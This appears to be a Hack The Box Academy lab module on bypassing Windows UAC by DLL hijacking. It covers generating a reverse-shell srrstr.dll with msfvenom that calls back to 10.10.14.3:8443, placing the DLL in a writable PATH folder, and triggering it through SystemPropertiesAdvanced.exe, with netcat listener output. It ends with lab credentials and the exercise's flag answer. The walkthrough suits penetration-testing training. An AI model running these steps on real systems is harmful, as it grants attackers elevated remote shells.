# User Account Control
[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a consent prompt for elevated activities.

There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:

<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Group Policy Setting</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Registry Key</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Default Setting</th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account" rel="nofollow" target="_blank" class="hover:underline text-green-400">User Account Control: Admin Approval Mode for the built-in Administrator account</a></td><td class="p-4">FilterAdministratorToken</td><td class="p-4">Disabled</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop" rel="nofollow" target="_blank" class="hover:underline text-green-400">User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop</a></td><td class="p-4">EnableUIADesktopToggle</td><td class="p-4">Disabled</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode" rel="nofollow" target="_blank" class="hover:underline text-green-400">User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode</a></td><td class="p-4">ConsentPromptBehaviorAdmin</td><td class="p-4">Prompt for consent for non-Windows binaries</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users" rel="nofollow" target="_blank" class="hover:underline text-green-400">User Account Control: Behavior of the elevation prompt for standard users</a></td><td class="p-4">ConsentPromptBehaviorUser</td><td class="p-4">Prompt for credentials on the secure desktop</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation" rel="nofollow" target="_blank" class="hover:underline text-green-400">User Account Control: Detect application installations and prompt for elevation</a></td><td class="p-4">EnableInstallerDetection</td><td class="p-4">Enabled (default for home) Disabled (default for enterprise)</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated" rel="nofollow" target="_blank" class="hover:underline text-green-400">User Account Control: Only elevate executables that are signed and validated</a></td><td class="p-4">ValidateAdminCodeSignatures</td><td class="p-4">Disabled</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations" rel="nofollow" target="_blank" class="hover:underline text-green-400">User Account Control: Only elevate UIAccess applications that are installed in secure locations</a></td><td class="p-4">EnableSecureUIAPaths</td><td class="p-4">Enabled</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode" rel="nofollow" target="_blank" class="hover:underline text-green-400">User Account Control: Run all administrators in Admin Approval Mode</a></td><td class="p-4">EnableLUA</td><td class="p-4">Enabled</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation" rel="nofollow" target="_blank" class="hover:underline text-green-400">User Account Control: Switch to the secure desktop when prompting for elevation</a></td><td class="p-4">PromptOnSecureDesktop</td><td class="p-4">Enabled</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations" rel="nofollow" target="_blank" class="hover:underline text-green-400">User Account Control: Virtualize file and registry write failures to per-user locations</a></td><td class="p-4">EnableVirtualization</td><td class="p-4">Enabled</td></tr></tbody></table>

The `default RID 500 administrator account` always operates at the high mandatory level. With Admin Approval Mode (AAM) enabled, any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in. 

### Checking Current User

```cmd
C:\htb> whoami /user

USER INFORMATION
----------------

User Name         SID
================= ==============================================
winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002
```

### Confirming Admin Group Membership

```cmd
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
mrb3n
sarah
The command completed successfully.
```

### Reviewing User Privileges

```cmd
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### Confirming UAC is Enabled
There is no command-line version of the GUI consent prompt, so we will have to bypass UAC to execute commands with our privileged access token. First, let's confirm if UAC is enabled and, if so, at what level.

```cmd
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

### Checking UAC Level

```cmd
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

The value of `ConsentPromptBehaviorAdmin` is `0x5`, which means the highest UAC level of `Always notify` is enabled. There are fewer UAC bypasses at this highest level.

### Checking Windows Version
UAC bypasses leverage flaws or unintended functionality in different Windows builds. Let's examine the build of Windows we're looking to elevate on.

```pwsh
PS C:\htb> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

This returns the build version 14393, which using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page we cross-reference to Windows release 1607.

The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it.

According to this blog post, the 32-bit version of `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL `srrstr.dll`, which is used by `System` Restore functionality.

When attempting to locate a DLL, Windows will use the following search order.

1. The directory from which the application loaded.
2. The system directory C:\Windows\System32 for 64-bit systems.
3. The 16-bit system directory C:\Windows\System (not supported on 64-bit systems)
4. The Windows directory.
5. Any directories that are listed in the PATH environment variable.

### Reviewing Path Variable
Let's examine the path variable using the command cmd /c echo %PATH%. This reveals the default folders below. The WindowsApps folder is within the user's profile and writable by the user.

```powershell
PS C:\htb> cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```

We can potentially bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` DLL to WindowsApps folder, which will be loaded in an elevated context.

### Generating Malicious srrstr.dll DLL
First, let's generate a DLL to execute a reverse shell.

```shellsession
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 5120 bytes
```

Transfer the DLL to the target.

### Testing Connection
If we execute the malicious `srrstr.dll` file, we will receive a shell back showing normal user rights (UAC enabled). To test this, we can run the DLL using `rundll32.exe` to get a reverse shell connection.

```cmd
C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

Once we get a connection back, we'll see normal user rights.

```shellsession
$ nc -lnvp 8443

listening on [any] 8443 ...

connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Users\sarah> whoami /priv

whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### Executing SystemPropertiesAdvanced.exe on Target Host
Before proceeding, we should ensure that any instances of the rundll32 process from our previous execution have been terminated.

```cmd
C:\htb> tasklist /svc | findstr "rundll32"
rundll32.exe                  6300 N/A
rundll32.exe                  5360 N/A
rundll32.exe                  7044 N/A

C:\htb> taskkill /PID 7044 /F
SUCCESS: The process with PID 7044 has been terminated.

C:\htb> taskkill /PID 6300 /F
SUCCESS: The process with PID 6300 has been terminated.

C:\htb> taskkill /PID 5360 /F
SUCCESS: The process with PID 5360 has been terminated.
```

Now, we can try the 32-bit version of `SystemPropertiesAdvanced.exe` from the target host.

```cmd
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

Checking back on our listener, we should receive a connection almost instantly.

```shellsession
masterofblafu@htb[/htb]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
winlpe-ws03\sarah


C:\Windows\system32>whoami /priv

whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

## Questions
RDP to 10.129.89.167 (ACADEMY-WINLPE-WS03), with user `sarah` and password `HTB_@cademy_stdnt!`
1. Follow the steps in this section to obtain a reverse shell connection with normal user privileges and another which bypasses UAC. Submit the contents of flag.txt on the sarah user's Desktop when finished. **Answer: I_bypass3d_Uac!**
   - Follow the instruction in this section